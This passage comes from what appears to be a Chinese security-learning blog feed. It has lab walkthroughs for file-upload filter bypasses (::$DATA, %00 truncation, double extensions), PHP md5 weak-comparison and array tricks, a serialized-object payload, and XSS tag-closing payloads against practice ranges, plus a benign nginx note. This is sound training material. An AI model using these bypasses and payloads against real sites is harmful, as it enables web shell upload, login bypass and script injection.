class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出他屏蔽了很多的后缀所以我们必须改后缀了</p><p>第五题</p><p>提交一个1.PHP3. . . . 然后发现他去掉了后缀名和所以再来尝试双写发现不行,然后重新试了一下PHP发现可以….&#x3D;&#x3D;事实证明你要一步一步的证明你的猜想不能急&#x3D;&#x3D;</p><p>第六题提交一个<code>1.PHP  </code>直接成功</p><p>第七题提交了一个1.PHP.直接成功</p><p>第八题上传一个1.php::$DATA直接成功</p><p>第九题上传<code>1.php.  .</code>后成功</p><p>第十题上传1.php后发现只剩1.了所以采用双写发现成功绕过</p><p>第十一题请求一个php发现存在savePath所以可以采用%00截断</p><p>第十二题发现GET变成了POST所以在传输%00的时候要将%00选中右击Convert Selection-&gt;URL-&gt;URL-decode</p><p>十三题到十五题是文件包含漏洞</p><p>首先上传一个,包含gif头文件的1.gif内容是payload,然后使用include去包含这个文件</p><p><img src="/.com//....%5Cpublic%5Cimg%5Cupload-2.png" alt="image-20220118221823774"></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>安全</tag>
      
      <tag>靶场练习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件上传漏洞</title>
    <link href="/2022/01/17/PHP%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"/>
    <url>/2022/01/17/PHP%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h3 id="和"><a href="#和" class="headerlink" title="==和==="></a>==和===</h3><p>&#x3D;&#x3D; 是比较数值，不比较类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">998</span>==<span class="hljs-string">&quot;998&quot;</span>); <span class="hljs-literal">true</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">998</span>==<span class="hljs-string">&quot;998ab&quot;</span>); <span class="hljs-literal">true</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">0</span>==<span class="hljs-string">&quot;haha&quot;</span>); <span class="hljs-literal">true</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-number">123</span>===<span class="hljs-number">123</span>); <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>mdpass的第一题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">md4 md5加密都有可能出现一个<span class="hljs-number">0</span>e开头<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>;;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-comment">//$r = 0e1 0e2 ... 0e251288019</span><br>    <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;0e&quot;</span>.<span class="hljs-variable">$i</span>;<br>    <span class="hljs-comment">//$md4 = 0e874956163641961271069404332409 </span><br>    <span class="hljs-variable">$md4</span> = <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&quot;md4&quot;</span>,<span class="hljs-variable">$r</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$i</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^0e[0-9]*$/&quot;</span>, <span class="hljs-variable">$md4</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md4加密前&quot;</span>.<span class="hljs-variable">$r</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md4加密后&quot;</span>.<span class="hljs-variable">$md4</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以使用md4的漏洞机制</p><blockquote><p>0e251288019<br>0e001233333333333334557778889</p></blockquote><p><img src="/.com//....%5Cpublic%5Cimg%5CPHPBug-2.png" alt="image-20220121131916793"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;pass-02.php&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>        <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span> != <span class="hljs-variable">$pass</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$user</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;pass-03.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail~~~&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input the user and pass!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>第二关是md5的</p><p>可以看出上面的要求我们用户名和密码不一样但是md5是一样的所以只要找出两个0e开头就可以了,下面这些随便挑两个不一样的就行</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns">md5弱类型比较<br>IHKFRNS <span class="hljs-number">0</span>e256160682445802696<span class="hljs-number">926137988570</span><br>QLTHNDT <span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br>QNKCDZO <span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br><span class="hljs-number">3908336290</span> <span class="hljs-number">0</span>e8076244989591904<span class="hljs-number">15881248245271</span><br><span class="hljs-number">4011627063</span> <span class="hljs-number">0</span>e4858056870344399059<span class="hljs-number">38362701775</span><br><span class="hljs-number">4775635065</span> <span class="hljs-number">0</span>e998212089946640967<span class="hljs-number">599450361168</span><br><span class="hljs-number">0e215962017</span> <span class="hljs-number">0</span>e291242476940776845<span class="hljs-number">150308577824</span><br>aabg7XSs <span class="hljs-number">0</span>e0873864821360137409<span class="hljs-number">57780965295</span><br>aabC9RqS <span class="hljs-number">0</span>e0410225181657280653<span class="hljs-number">44349536299</span><br></code></pre></td></tr></table></figure><p>或者使用数组跳过也可以</p><h2 id="x3D-x3D-因为数组md5后是null-x3D-x3D"><a href="#x3D-x3D-因为数组md5后是null-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;因为数组md5后是null&#x3D;&#x3D;"></a>&#x3D;&#x3D;因为数组md5后是null&#x3D;&#x3D;</h2><blockquote><p>&#x2F;pass-02.php?user[]&#x3D;1&amp;pass[]&#x3D;2</p></blockquote><p>第三题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;pass-03.php&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>        <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$user</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$pass</span>) &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$user</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;pass-04.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail~~~&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input the user and pass!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>用函数判断一个是纯英文一个是纯数字同样使用弱命令即可</p><blockquote><p>?pass&#x3D;IHKFRNS&amp;user&#x3D;3908336290</p></blockquote><p>第四题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;pass-04.php&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>        <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span> != <span class="hljs-variable">$pass</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$user</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;pass-05.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail~~~&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input the user and pass!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为user!&#x3D;pass所以不能两个都是数组又因为pass被md5两次所以不能使用弱密码了</p><p>采用pass为数组,user为空即可</p><blockquote><p>?pass[]&#x3D;1&amp;user&#x3D;</p></blockquote><p>第四题和第五题一样</p><p>第六题比较严厉,只能遍历出弱比较了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;pass-06.php&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$user</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>        <span class="hljs-variable">$pass</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span> != <span class="hljs-variable">$pass</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$user</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;pass-07.php&#x27;&gt;下一关&lt;/a&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail~~~&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input the user and pass!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>因为将类型转化为String所以array,null,INF,NAN都不行</p><blockquote><p>user&#x3D;240610708&amp;pass&#x3D;aawBzC</p><p>240610708—aawBzC</p></blockquote><p><img src="/.com//....%5Cpublic%5Cimg%5CPHPBug-3.png" alt="image-20220121134720525"></p><p>第七题还是用数组过滤</p><p>第八题涉及到反序列化漏洞</p><blockquote><p>auth&#x3D;O:4:”auth”:2:{s:4:”user”;d:INF;s:4:”pass”;d:INF;}</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;pass-08.php&quot;</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">auth</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;user = (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;user;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;user) &gt; <span class="hljs-number">3</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;pass) &gt;<span class="hljs-number">3</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;level1 is fail~~~&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user !== <span class="hljs-variable language_">$this</span>-&gt;pass &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;user != <span class="hljs-variable language_">$this</span>-&gt;pass &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;user) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;pass))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success!&lt;br&gt;&quot;</span>;    <br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;level2 is fail~~~&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;auth&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>安全</tag>
      
      <tag>靶场练习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginx</title>
    <link href="/2022/01/17/nginx/"/>
    <url>/2022/01/17/nginx/</url>
    
    <content type="html"><![CDATA[<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><a href="https://www.w3cschool.cn/nginx/sd361pdz.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E6%88%91%E8%A7%89%E5%BE%97%E4%BB%8B%E7%BB%8D%E7%9A%84%E5%BE%88%E5%A5%BD">https://www.w3cschool.cn/nginx/sd361pdz.html这篇文章我觉得介绍的很好</a></p><p>nginx会有一个master进程和多个worker进程(一般由cpu的核数决定)，master通过外界接受的新号来管理worker进程(比如:kill -HUP pid这句话是告诉nginx需要重启,master收到新号后会重新加载配置文件然后创建新的worker替代掉老的worker)，而worker进程是和用户进行交流的&#x3D;&#x3D;我们可以关闭master和后台然后进行调试&#x3D;&#x3D;。</p><p>master如何管理worker呢？</p><p>首先master先建立listen socket链接，然后再fork多个worker进程，所有 worker 进程的 listenfd 会在新连接到来时变得可读之后所有的worker回去争抢读事件权。&#x3D;&#x3D;所以一个请求只在一个worker中处理&#x3D;&#x3D;，采用有着如下好处：</p><ul><li>一个worker罢工后不会影响到别的</li><li>一个worker是一个请求处理所以省掉了上线文切换的资源浪费</li></ul><p>nginx和apache比较：</p><ul><li>nginx是采用异步非阻塞处理的方式，所以可以处理成千上万的请求。</li><li>apache是一个请求独占一个工作线程，线程带来的内存占用非常大，线程的上下文切换带来的 cpu 开销很大</li><li>nginx不会创建大量无用的工作进程</li><li>异步非阻塞：假如一个请求接收，分析，读取数据。然后发现IO阻塞他不会继续等待的而是把cpu让出去。不需要创建线程，每个请求占用的内存也很少，没有上下文切换，事件处理非常的轻量级。并发数再多也不会导致无谓的资源浪费（上下文切换）。更多的并发数，只是会占用更多的内存而已。 我之前有对连接数进行过测试，在 24G 内存的机器上，处理的并发请求数达到过 200 万。现在的网络服务器基本都采用这种方式，这也是nginx性能高效的主要原因。</li></ul><blockquote><p>上面那篇文章还有好多，但是搬运也可能搬不好所以这里就不继续贴了</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>后端</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS练习</title>
    <link href="/2022/01/16/XSS%E7%BB%83%E4%B9%A0/"/>
    <url>/2022/01/16/XSS%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h3 id="练习靶场一"><a href="#练习靶场一" class="headerlink" title="练习靶场一"></a>练习靶场一</h3><p><a href="http://xss1.njhack.xyz/">http://xss1.njhack.xyz</a></p><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>服务器代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>通过分析代码可以得出,没有设防直接注入即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">scriPt</span>&gt;</span><span class="language-javascript">  </span><br><span class="language-javascript">  <span class="hljs-title function_">alert</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">49</span>));</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/textarea&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>从源码可以看出,可以看出输入的内容被包裹在 textarea中间了,这样我们输入的任何内容会被弄成文本</p><p>所以,我们只需要闭合textarea就可以了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这题和第二题差不多,我们可以闭合input标签或者闭合”后构造其他语句,这里只给出一个答案</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 